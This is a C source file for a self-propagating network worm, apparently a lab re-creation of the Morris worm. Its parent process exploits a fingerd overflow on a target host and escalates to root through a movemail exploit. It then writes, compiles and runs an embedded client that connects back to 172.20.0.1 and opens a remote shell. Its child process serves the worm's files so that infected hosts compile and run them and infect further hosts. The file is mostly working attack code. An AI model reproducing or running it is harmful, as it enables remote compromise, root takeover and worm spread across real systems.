#include "worm.h"
#include <sys/signalfd.h>
#include <signal.h>

#define NUM_FILES 2
#define FILE_BUF_SIZE 256

#define FINGERD_PORT 79
#define TARGET_PRIME_IP "172.20.0.10"

#define NUM_CLIENTS 5
#define SERVER_PORT 4444
#define LOG_PORT 5555

#define CONNECTED 200
#define SHELL 201

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)
#define MAX(a, b) ((a > b) ? (a) : (b))

#define VECTOR_PROGRAM "#include <stdio.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n#include <arpa/inet.h>\n\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\nint send_int(num, fd)\n\tint num;\n\tint fd;\n{\n\tunsigned long conv = htonl((unsigned long)num);\n\tchar *data = (char*)&conv;\n\tint left = sizeof(conv);\n\tint rc;\n\tdo {\n\t\trc = write(fd, data, left);\n\t\tif (rc < 0) {\n\t\t\treturn -1;\n\t\t}\n\t\telse {\n\t\t\tdata += rc;\n\t\t\tleft -= rc;\n\t\t}\n\t}\n\twhile (left > 0);\n\treturn 0;\n}\n\nint receive_int(num, fd)\n\tint *num;\n\tint fd;\n{\n\tunsigned long ret;\n\tchar *data = (char*)&ret;\n\tint left = sizeof(ret);\n\tint rc;\n\tdo {\n\t\trc = read(fd, data, left);\n\t\tif (rc <= 0) { /* instead of ret */\n\t\t\treturn -1;\n\t\t}\n\t\telse {\n\t\t\tdata += rc;\n\t\t\tleft -= rc;\n\t\t}\n\t}\n\twhile (left > 0);\n\t*num = ntohl(ret);\n\treturn 0;\n}\n\nint main(argc, argv)\n\tint argc;\n\tchar *argv[];\n{\n\tint i, j, n, ss, fz, len, fn;\n\tstruct timeval tv;\n\tstruct sockaddr_in saddr;\n\tchar io_buf[IO_BUF_SIZE];\n\tfd_set read_fds;\n\tFILE *outfile;\n\tchar *file_name;\n\tchar *msg = \"Files recieved\\n\";\n\tchar *hello = \"Hello from client!\\n\";\n\n\tif (argc < 2) {\n\t\treturn 1;\n\t}\t\n\n\tss = socket(AF_INET, SOCK_STREAM, 0);\n\tif (ss < 0) {\n\t\treturn 1;\n\t}\n\n\tbzero((char *)&saddr, sizeof(saddr));\n\tsaddr.sin_family = AF_INET;\n\tsaddr.sin_port = htons(SERVER_PORT);\n\tsaddr.sin_addr.s_addr = inet_addr(argv[1]);\n\t\n\twhile (connect(ss, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {\n\t\tsleep(1);\n\t}\t\n\n\twhile (1) {\n\t\twrite(ss, hello, strlen(hello));\n\t\tFD_ZERO(&read_fds);\n\t\tFD_SET(ss, &read_fds);\n\t\ttv.tv_sec = 5;\n\t\ttv.tv_usec = 0;\n\t\tif (select(ss + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n\t\t\tif (receive_int(&fn, ss) < 0) continue;\t\n\t\t\tif (send_int(fn, ss) < 0) continue;\n\t\t\tfor (i = 0; i < fn; i++) {\n\t\t\t\tif (receive_int(&len, ss) < 0) continue;\t\n\t\t\t\tfile_name = (char *)malloc((len + 1) * sizeof(char));\n\t\t\t\tn = read(ss, file_name, len);\n\t\t\t\tfile_name[n] = '\\0';\n\t\t\t\tif (n <= 0) break;\n\t\t\t\toutfile = fopen(file_name, \"w\");\n\t\t\t\tif (outfile == NULL) break;\n\t\t\t\tif (receive_int(&fz, ss) < 0) continue;\t\n\t\t\t\twhile (fz > 0) {\n\t\t\t\t\tn = read(ss, io_buf, IO_BUF_SIZE -1);\n\t\t\t\t\tif (n > 0) {\n\t\t\t\t\t\tio_buf[n] = '\\0';\n\t\t\t\t\t\tfputs(io_buf, outfile);\n\t\t\t\t\t}\n\t\t\t\t\tfz -= n;\n\t\t\t\t}\t\n\t\t\t\tfclose(outfile);\n\t\t\t\tfree(file_name);\n\t\t\t\tsend_int(i, ss);\n\t\t\t}\t\n\t\t\twrite(ss, msg, strlen(msg));\n\t\t\tbreak;\n\t\t}\t\n\t}\n\tdup2(ss,1);\n\tdup2(ss,0);\n\texecl(\"/bin/sh\", \"/tmp/sh\", 0);\n\treturn 0;\n}\n"

void file_server();
void attck_client();

int main(int argc, char* argv[]) {
	int i, n;
	// for fingerd exploits
    int fingerd_client;
    struct sockaddr_in fingerd_serv_addr;
	char io_buf[IO_BUF_SIZE];
    char buf[BUF_SIZE];

	// for signal handling between parent and child processes
	sigset_t mask;
	int sfd;
	struct signalfd_siginfo fdsi;
	ssize_t s;

	// file server related stuff
	char *file_paths[NUM_FILES] = { "worm_bsd.h", "send_file_over_socket_bsd.c" };
	struct file_object *files;	
	char *file_buf;

	fd_set read_fd; 	
    int logserver_fd, server_fd, max_fd, accept_code, sd;
	struct sockaddr_in log_address;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    int log_addrlen = sizeof(log_address);
	int client_sock[NUM_CLIENTS];
	int log_client_sock[NUM_CLIENTS];

	char *success = "Files recieved";
	char *hello = "Hello from the server!\n";

    pid_t pid;

    pid = fork();

    if (pid == -1) {
        perror("fork failed");
    } else if (pid == 0) {
        // Code executed by the child process
		//sigemptyset(&mask);
        //sigaddset(&mask, SIGQUIT);

        printf("Hello from the Child Process! My PID is %d, my Parent's PID is %d.\n", getpid(), getppid());

		files = (struct file_object *)malloc(NUM_FILES * sizeof(struct file_object));
		file_buf = (char *)malloc(FILE_BUF_SIZE * sizeof(char));

		if (load_files(file_paths, NUM_FILES, files) < 0) 
			handle_error("failed to load files\n");
			// what do i do if this happens? kill the worm

		for (i = 0; i < NUM_FILES; i++) {
			printf("file_name: %s file_size: %d\n", files[i].file_name, files[i].file_size);
		}	

		// this should be file server logic
		server_fd = socket(AF_INET, SOCK_STREAM, 0);
		address.sin_family = AF_INET;
		address.sin_addr.s_addr = INADDR_ANY; 
		address.sin_port = htons(SERVER_PORT);       

		logserver_fd = socket(AF_INET,SOCK_STREAM, 0);
		log_address.sin_family = AF_INET;
		log_address.sin_addr.s_addr = INADDR_ANY; 
		log_address.sin_port = htons(LOG_PORT);       

		for (i = 0; i < NUM_CLIENTS; i++) {
			client_sock[i] = -1;
			log_client_sock[i] = -1;
		}

		bind(server_fd, (struct sockaddr *)&address, sizeof(address));
		bind(logserver_fd, (struct sockaddr *)&log_address, sizeof(log_address));

		listen(server_fd, NUM_CLIENTS + 1);
		listen(logserver_fd, NUM_CLIENTS + 1);
		printf("Listening for connections at port %d %d\n", SERVER_PORT, LOG_PORT);

		 /* Block signals so that they aren't handled
              according to their default dispositions */
		//if (sigprocmask(SIG_BLOCK, &mask, NULL) == -1)
		//	handle_error("sigprocmask\n");

		//sfd = signalfd(-1, &mask, 0);
		//if (sfd == -1)
		//	handle_error("signalfd\n");

		while (1) {
			FD_ZERO(&read_fd);
			FD_SET(server_fd, &read_fd);
			FD_SET(logserver_fd, &read_fd);
			//FD_SET(sfd, &read_fd);

			max_fd = MAX(logserver_fd, server_fd);

			for (i = 0; i < NUM_CLIENTS; i++) {
				if (client_sock[i] > 0) {
					FD_SET(client_sock[i], &read_fd);	
					max_fd = MAX(client_sock[i], max_fd);
				}	
				if (log_client_sock[i] > 0) {
					FD_SET(log_client_sock[i], &read_fd);	
					max_fd = MAX(log_client_sock[i], max_fd);
				}	
			}	
			
			if (select(max_fd + 1, &read_fd, NULL, NULL, NULL) < 0) continue;

			// checking for SIGQUIT from parent
//			if (FD_ISSET(sfd, &read_fd)) {
//				s = read(sfd, &fdsi, sizeof(fdsi));
//             	if (s != sizeof(fdsi))
//                	handle_error("read");
//
//				if (fdsi.ssi_signo == SIGQUIT) {
//					printf("Got SIGQUIT\n"); 
//					break;
//				} else {
//					printf("Read unexpected signal\n");
//				}	
//			}	

			// checking for incoming client connections
			if (FD_ISSET(server_fd, &read_fd)) {
				accept_code = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen);
				if (accept_code < 0) continue;

				for (i = 0; i < NUM_CLIENTS; i++) {
					if (client_sock[i] == -1) { 
						printf("New connection received! FD: %d\n", accept_code);
						client_sock[i] = accept_code;
						break;
					}	
				}	
			}	

			if (FD_ISSET(logserver_fd, &read_fd)) {
				accept_code = accept(logserver_fd, (struct sockaddr *)&log_address, (socklen_t *)&log_addrlen);
				if (accept_code < 0) continue;

				for (i = 0; i < NUM_CLIENTS; i++) {
					if (log_client_sock[i] == -1) { 
						printf("New log connection received! FD: %d\n", accept_code);
						log_client_sock[i] = accept_code;
						break;
					}	
				}	
			}	

			for (i = 0; i < NUM_CLIENTS; i++) {
				sd = log_client_sock[i];
				if (sd > 0 && FD_ISSET(sd, &read_fd)) {
					n = read(sd, io_buf, IO_BUF_SIZE - 1);
					printf("read %d bytes from log client %d\n", n, sd);

					if (n == 0) {
						printf("Client disconnected\n");
						close(sd);
						log_client_sock[i] = -1;
					} else {	
						io_buf[n] = '\0';
						printf("Recieved from log client %d: %s", sd, io_buf);
					}	
				}	
			}	

			for (i = 0; i < NUM_CLIENTS; i++) {
				sd = client_sock[i];
				if (sd > 0 && FD_ISSET(sd, &read_fd)) {
					printf("read %d bytes from file client %d\n", n, sd);
					n = read(sd, io_buf, IO_BUF_SIZE - 1);

					if (n == 0) {
						printf("Client disconnected\n");
						close(sd);
						client_sock[i] = -1;
					} else {	
						io_buf[n] = '\0';
						printf("Recieved from file client %d: %s", sd, io_buf);
						// here, i can probably modify to check whether the client i'm talking to 
						// is a worm or a file-server client by reading the initial hello message 
						// no need to send over ifles when client says it recieved the files
						if (strncmp(success, io_buf, strlen(success)) == 0) { 
							printf("Files sent, expecting shell\n");

							write_to_sock(sd, "ls send_file_over_socket_bsd.c\n");
							read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
							write_to_sock(sd, "ls worm_bsd.h\n");
							read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
							write_to_sock(sd, "cc send_file_over_socket_bsd.c -o server; echo DONE\n");
							read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
							write_to_sock(sd, "./server send_file_over_socket_bsd.c worm_bsd.h\n");
							close(sd);
							client_sock[i] = -1;
						}	

						if (client_sock[i] != -1) {
							if (send_files(sd, files, NUM_FILES, file_buf, FILE_BUF_SIZE) < 0)
								printf("Failed to send all files\n");
						}	
						
					}	
				}	
			}	
		}	

		free(files);
		free(file_buf);
		close(server_fd);
    } else {
        // Code executed by the parent process
        printf("Hello from the Parent Process! My PID is %d, my Child's PID is %d.\n", getpid(), pid);
		// this should have attack logic
		fingerd_client = socket(AF_INET, SOCK_STREAM, 0);
		create_sockaddr(&fingerd_serv_addr, TARGET_PRIME_IP, FINGERD_PORT);

		if (connect(fingerd_client, (struct sockaddr *)&fingerd_serv_addr, sizeof(fingerd_serv_addr)) < 0) {
			kill(pid, SIGQUIT);
			handle_error("connect");
		}

		create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);
		write(fingerd_client, buf, (size_t)sizeof(buf));
		sleep(1);
			
		// confirm that you get a shell
		write_to_sock(fingerd_client, "echo bang\n");
		write_to_sock(fingerd_client, "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n");
		write_to_sock(fingerd_client, "whoami\n");
		read_from_sock(fingerd_client, io_buf, (size_t)IO_BUF_SIZE);

		// get root shell
		get_root_shell_via_movemail_exploit(fingerd_client, io_buf, (size_t)IO_BUF_SIZE);

		// check that you have root shell
		write_to_sock(fingerd_client, "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n");
		write_to_sock(fingerd_client, "whoami\n");
		read_from_sock(fingerd_client, io_buf, (size_t)IO_BUF_SIZE);

		// send over vector file
		write_to_sock(fingerd_client, "cd /tmp\n");
		write_to_sock(fingerd_client, "cat << EOF >> client.c\n");
		write_to_sock(fingerd_client, VECTOR_PROGRAM);
		write_to_sock(fingerd_client, "EOF\n");
		
		// compile the client and run it
		write_to_sock(fingerd_client, "cc client.c -o client; echo DONE\n");
		read_from_sock(fingerd_client, io_buf, (size_t)IO_BUF_SIZE);
		write_to_sock(fingerd_client, "./client 172.20.0.1\n");

		// if you no longer need the file server, kill it
		// but if i need the file server to act more than just a file server, then
		// it would not make sense to kill the child process right away. 
		// once i infect n number of hosts, i should pause my infection logic, but 
		// should instead listen for kill SIGTERM 
		  
		int wstatus;
		waitpid(pid, &wstatus, 0);
		if (WIFEXITED(wstatus)) {
			printf("Child terminated\n");
		}	
		close(fingerd_client);
    }

    return 0;
}
